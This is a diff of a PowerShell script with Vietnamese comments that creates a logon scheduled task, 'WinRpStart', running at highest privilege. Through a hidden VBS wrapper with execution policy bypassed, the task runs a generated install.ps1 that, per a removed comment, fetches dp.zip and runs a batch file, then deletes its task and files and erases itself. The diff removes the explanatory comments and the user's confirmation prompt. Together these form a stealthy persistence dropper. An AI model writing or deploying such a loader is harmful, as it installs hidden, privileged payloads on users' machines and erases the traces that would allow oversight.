@@ -1,7 +1,3 @@
-# create_and_schedule.ps1
-# Tạo scheduled task "WinRpStart" chạy install.ps1 lúc đăng nhập
-# Khi bạn xóa task, nó cũng xóa luôn install.ps1 và log.
-
 Set-StrictMode -Version Latest
 $ErrorActionPreference = 'Stop'
 
@@ -23,11 +19,7 @@ function Write-Err($msg) {
 Write-Info "Script directory: $scriptDir"
 Write-Info "Install script: $installPath"
 
-# 1️⃣ Nội dung file install.ps1
 $installContent = @'
-# install.ps1 - auto-generated
-# Tải dp.zip, giải nén, chạy new.bat.
-
 Try {
     Write-Output "===> Start at $(Get-Date -Format o)"
 
@@ -55,13 +47,8 @@ Try {
 } Catch {
     Write-Error "Error: $_"
 }Finally {
-    # Tự xóa task và các file liên quan
-    Write-Output "Removing scheduled task and files..."
-    
-    # Xóa task
     schtasks /Delete /TN "WinRpInstall" /F 2>$null | Out-Null
     
-    # Xóa các file
     $scriptPath = $MyInvocation.MyCommand.Path
     $scriptDir = Split-Path -Parent $scriptPath
     $vbsPath = Join-Path $scriptDir "run_hidden.vbs"
@@ -71,7 +58,6 @@ Try {
         Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue
     }
     
-    # Tạo một batch file tạm để xóa chính script này
     $tempBat = Join-Path $env:TEMP "cleanup_$(Get-Random).bat"
     @"
 @echo off
@@ -80,15 +66,12 @@ del "$scriptPath" >nul 2>&1
 del "$tempBat" >nul 2>&1
 "@ | Out-File -FilePath $tempBat -Encoding ASCII
     
-    # Chạy batch file tạm trong background
     Start-Process -FilePath $tempBat -WindowStyle Hidden
     
     Write-Output "Cleanup initiated."
 }
 '@
 
-# 2️⃣ Kiểm tra có task chưa
-Write-Info "Checking for existing task '$taskName'..."
 try {
     $exists = schtasks /Query /TN $taskName 2>$null
     $taskExists = $LASTEXITCODE -eq 0
@@ -97,29 +80,18 @@ try {
 }
 
 if ($LASTEXITCODE -eq 0) {
-    $choice = Read-Host "Nhập Y để xóa task này (và xóa luôn file ps1), hoặc nhấn Enter để giữ nguyên"
-    if ($choice -match '^[Yy]$') {
-        schtasks /Delete /TN $taskName /F | Out-Null
-
-        # Xóa file ps1 và log nếu tồn tại
-        if (Test-Path $installPath) {
-            Remove-Item $installPath -Force -ErrorAction SilentlyContinue
-        }
-        if (Test-Path $logPath) {
-            Remove-Item $logPath -Force -ErrorAction SilentlyContinue
-        }
-
-        exit 0
-    } else {
-        exit 0
+    if (Test-Path $installPath) {
+        Remove-Item $installPath -Force -ErrorAction SilentlyContinue
     }
+    if (Test-Path $logPath) {
+        Remove-Item $logPath -Force -ErrorAction SilentlyContinue
+    }
+
+    exit 0
 }
 
-# 3️⃣ Tạo file install.ps1
 Set-Content -Path $installPath -Value $installContent -Encoding UTF8
 
-# 4️⃣ Tạo task mới
-# Tạo file VBS trung gian để chạy PowerShell ẩn cửa sổ
 $vbsPath = Join-Path $scriptDir "run_hidden.vbs"
 
 $vbsContent = @"
@@ -129,10 +101,8 @@ objShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -File ""$installPath
 
 Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII
 
-# Lệnh cho schtasks gọi VBS thay vì gọi PowerShell trực tiếp
 $tr = "wscript.exe `"$vbsPath`""
 
-# Tạo task
 schtasks /Create /TN $taskName /TR $tr /SC ONLOGON /RL HIGHEST /F | Out-Null
 
 
@@ -143,5 +113,4 @@ if ($LASTEXITCODE -eq 0) {
     exit 1
 }
 
-# 5️⃣ Chạy task ngay
 schtasks /Run /TN $taskName | Out-Null
